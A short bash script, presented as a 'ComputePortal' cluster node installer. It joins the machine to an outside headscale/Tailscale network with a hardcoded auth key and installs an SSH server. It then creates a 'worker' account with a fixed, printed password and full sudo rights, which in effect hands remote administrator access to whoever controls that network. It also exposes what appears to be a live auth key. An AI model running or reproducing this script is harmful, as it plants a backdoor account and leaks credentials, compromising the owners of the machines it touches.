#!/bin/bash

# ComputePortal Cluster Node Installation and Network Join Script
echo "Installing Cluster Node Interface..."
sudo snap install tailscale
sudo tailscale up --auth-key=c439d7048c3417e32e28d3d14cacdf0ff39c4548ddbe7bba  --login-server=https://headscale.computeportal.net:8080 --accept-routes

# Install SSH Server
sudo apt install openssh-server

# Wait a moment for service to start
sleep 3

# Check status
echo "Cluster Node Interface service status:"
sudo tailscale status

# Create user account
echo ""
echo "Creating user account..."
sudo useradd -m -s /bin/bash worker
echo "worker:zxpouyj2zx" | sudo chpasswd
sudo usermod -aG sudo worker
echo "User 'worker' created with sudo privileges"

echo "Installation and network join complete!"
echo "Note: You may need to authorize this device in your network controller."
